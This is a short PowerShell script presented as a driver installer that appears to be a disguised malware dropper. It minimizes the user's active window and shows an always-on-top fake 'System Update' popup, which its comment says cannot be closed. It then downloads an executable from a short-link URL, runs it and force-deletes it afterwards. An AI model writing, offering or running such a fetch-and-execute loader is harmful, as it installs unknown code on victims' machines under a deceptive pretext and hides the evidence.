# Driver Installer Script
$url = "https://dkm.s.gy/file"
$out = "$env:USERPROFILE\Downloads\drivers.exe"

# --- Window Management Setup ---
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WindowHelper {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$hWnd = [WindowHelper]::GetForegroundWindow()
[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize

# --- Persistent Popup ---
$wshell = New-Object -ComObject Wscript.Shell
$popup = $wshell.Popup("Installing drivers... Please wait.", 0, "System Update", 0x1000 + 0x40) 
# 0x1000 = Always on Top, 0x40 = No buttons (cannot be closed by user)

Write-Host "Starting installation..." -ForegroundColor Cyan

# Download the file
Write-Host "importing...." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

# Run the file
if (Test-Path $out) {
    Write-Host "Running..." -ForegroundColor Green
    Start-Process -FilePath $out -Wait
    Write-Host "complete!" -ForegroundColor Green

    # Remove the file after running
    Remove-Item $out -Force -ErrorAction SilentlyContinue
    Write-Host "Cleanup complete." -ForegroundColor Gray
} else {
    Write-Warning "swerteeng kumag"
}

# Close the popup and exit
$wshell.Popup("Installation Complete!", 2, "Done", 0x40)
exit
